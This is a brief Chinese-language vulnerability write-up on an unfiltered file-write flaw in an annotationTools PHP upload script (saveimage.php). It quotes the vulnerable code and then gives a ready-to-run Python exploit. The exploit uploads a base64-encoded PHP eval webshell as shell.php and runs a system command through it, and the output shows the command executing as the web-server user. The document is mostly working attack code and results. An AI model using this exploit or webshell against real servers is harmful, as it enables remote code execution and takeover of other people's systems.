## 触发链
```
// annotationTools/php/saveimage.php
if ( isset($_POST["image"]) && !empty($_POST["image"]) ) {
    define('UPLOAD_DIR', $_POST["uploadDir"]);  // 可控路径
    $dataURL = $_POST["image"];                 // 可控内容
    ...
    $file = $TOOLHOME . UPLOAD_DIR . $_POST["name"];  // 可控文件名
    $success = file_put_contents($file, $data);         // 文件写入 sink
}
```
对传入内容没有任何限制和过滤

## exp
```
import requests
url='http://127.0.0.1'
data={'image':'data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==',
      'name':'shell.php',
      'uploadDir':''}
response=requests.post(url+'/annotationTools/php/saveimage.php',data=data)
res=requests.post(url+"/shell.php",data={1:'system("id");'})
print(res.text)
```
输出
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```